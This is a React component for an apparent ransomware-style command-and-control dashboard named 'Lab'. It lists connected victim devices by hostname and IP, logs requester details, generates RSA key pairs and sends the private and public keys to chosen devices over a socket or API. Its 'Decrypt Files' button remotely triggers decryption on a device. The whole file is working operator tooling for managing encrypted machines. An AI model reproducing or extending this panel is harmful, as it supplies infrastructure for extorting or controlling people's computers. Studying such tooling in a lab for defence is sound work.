import { useEffect, useRef, useState } from 'react'
import { initSocket } from './socketClient'

const RAW_API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8080/api'
const API_BASE = `${RAW_API_BASE.replace(/\/$/, '')}/py_simple`

export default function Lab() {
  const [status, setStatus] = useState('')
  const [loading, setLoading] = useState(false)
  const [deviceInfo, setDeviceInfo] = useState(null)
  const [devices, setDevices] = useState([])
  const [selectedToken, setSelectedToken] = useState('')
  const [publicKey, setPublicKey] = useState('')
  const [privateKey, setPrivateKey] = useState('')
  const [socketStatus, setSocketStatus] = useState('disconnected')
  const socketRef = useRef(null)
  const selectedDevice = devices.find(d => d.token === selectedToken) || null

  useEffect(() => {
    refreshDeviceInfo()
    loadDevices()
    try {
      socketRef.current = initSocket({
        apiBase: API_BASE,
        startDeviceOnConnect: true,
        onStatus: (st) => setSocketStatus(st),
        onAck: (msg) => { if (msg?.status === 'ok') setStatus('Server acknowledged request') }
      })
    } catch (_) { /* ignore */ }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  const triggerDecrypt = async () => {
    try {
      setLoading(true)
      const payload = selectedToken ? { token: selectedToken } : {}
      if (socketRef.current && socketStatus === 'connected') {
        socketRef.current.emit('site_decrypt', payload)
        setStatus('Decrypt request sent to device')
      } else {
        const res = await fetch(`${API_BASE}/decrypt`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
        })
        const data = await res.json()
        setStatus(data.status || 'Decryption request sent')
      }
    } catch (e) { setStatus(`Failed to decrypt: ${e}`) } finally { setLoading(false) }
  }

  async function refreshDeviceInfo() {
    try {
      setLoading(true)
      const res = await fetch(`${API_BASE}/keys/last-request`)
      const data = await res.json()
      setDeviceInfo(Object.keys(data || {}).length ? data : null)
      setStatus('Device info refreshed')
    } catch (e) { setStatus(`Failed to load device info: ${e}`) } finally { setLoading(false) }
  }

  async function loadDevices() {
    try {
      const res = await fetch(`${API_BASE}/devices`)
      const data = await res.json()
      setDevices(data.devices || [])
      if ((data.devices || []).length && !selectedToken) { setSelectedToken(data.devices[0].token) }
    } catch (_) { /* ignore */ }
  }

  const requestPublicKey = async () => {
    try {
      setLoading(true); setStatus('')
      const res = await fetch(`${API_BASE}/keys/rsa`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({}) })
      const data = await res.json()
      if (res.ok) { setPublicKey(data.public_key_pem || ''); setPrivateKey(data.private_key_pem || ''); setDeviceInfo(data.device || null); setStatus('Key pair generated') }
      else { setStatus(`Public key request failed: ${data.error || res.status}`) }
    } catch (e) { setStatus(`Public key request error: ${e}`) } finally { setLoading(false) }
  }

  const attachKeysToDevice = async () => {
    if (!selectedToken || (!publicKey && !privateKey)) { setStatus('Select a device and generate keys first'); return }
    try {
      setLoading(true)
      if (socketRef.current && socketStatus === 'connected') {
        socketRef.current.emit('site_keys', { token: selectedToken, public_key_pem: publicKey, private_key_pem: privateKey || undefined })
        setStatus('Keys sent via socket'); await loadDevices()
      } else {
        const res = await fetch(`${API_BASE}/devices/${selectedToken}/keys`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ public_key_pem: publicKey, private_key_pem: privateKey || undefined }) })
        if (res.ok) { setStatus('Keys attached to device'); await loadDevices() }
        else { const data = await res.json(); setStatus(`Attach failed: ${data.error || res.status}`) }
      }
    } catch (e) { setStatus(`Attach error: ${e}`) } finally { setLoading(false) }
  }

  const copyToClipboard = async (text) => {
    try { await navigator.clipboard.writeText(text); setStatus('Copied to clipboard') }
    catch { setStatus('Copy failed') }
  }

  return (
    <main className="container">
      <section className="card grid">
        <div className="card-section">
          <h2>Quick Actions</h2>
          <p className="muted">Trigger a full decrypt on the backend</p>
          <div className="actions">
            <button className="btn primary" onClick={triggerDecrypt} disabled={loading}>{loading ? 'Working…' : 'Decrypt Files'}</button>
          </div>
          {status && <div className="toast">{status}</div>}
        </div>
        <div className="card-section">
          <h2>Device & Keys</h2>
          <div className="muted" style={{marginBottom: 8}}>Socket: {socketStatus}</div>
          <div className="field">
            <label>Connected Devices</label>
            <select className="input" value={selectedToken} onChange={(e) => setSelectedToken(e.target.value)}>
              {devices.map(d => (<option key={d.token} value={d.token}>{d.hostname || d.token.slice(0,8)} • {d.ip || 'ip?'} • {d.connected ? 'online' : 'offline'}</option>))}
            </select>
            <button className="btn ghost" onClick={loadDevices} style={{marginTop: 8}}>Refresh</button>
          </div>
          <div className="actions">
            <button className="btn" onClick={requestPublicKey} disabled={loading}>Generate Key Pair</button>
            <button className="btn" onClick={attachKeysToDevice} disabled={loading || !selectedToken || (!publicKey && !privateKey)}>Attach to Device</button>
            <button className="btn" onClick={refreshDeviceInfo} disabled={loading}>Refresh Device Info</button>
          </div>
          {deviceInfo && (
            <div className="kv">
              <div><span className="k">Requester IP</span><span className="v">{deviceInfo.requester_ip || '—'}</span></div>
              <div><span className="k">Requester Hostname</span><span className="v">{deviceInfo.requester_hostname || '—'}</span></div>
              <div><span className="k">Timestamp</span><span className="v">{deviceInfo.timestamp ? new Date(deviceInfo.timestamp * 1000).toLocaleString() : '—'}</span></div>
            </div>
          )}
          {publicKey && (
            <div className="field">
              <label>Generated Public Key (PEM)</label>
              <div className="code"><pre>{publicKey}</pre><button className="btn ghost" onClick={() => copyToClipboard(publicKey)}>Copy</button></div>
            </div>
          )}
          {privateKey && (
            <div className="field">
              <label>Generated Private Key (PEM)</label>
              <div className="code"><pre>{privateKey}</pre><button className="btn ghost" onClick={() => copyToClipboard(privateKey)}>Copy</button></div>
            </div>
          )}
          {selectedDevice?.public_key_pem && (
            <div className="field">
              <label>Device Public Key (stored)</label>
              <div className="code"><pre>{selectedDevice.public_key_pem}</pre><button className="btn ghost" onClick={() => copyToClipboard(selectedDevice.public_key_pem)}>Copy</button></div>
            </div>
          )}
          {selectedDevice?.private_key_pem && (
            <div className="field">
              <label>Device Private Key (stored)</label>
              <div className="code"><pre>{selectedDevice.private_key_pem}</pre><button className="btn ghost" onClick={() => copyToClipboard(selectedDevice.private_key_pem)}>Copy</button></div>
            </div>
          )}
        </div>
      </section>
    </main>
  )
}
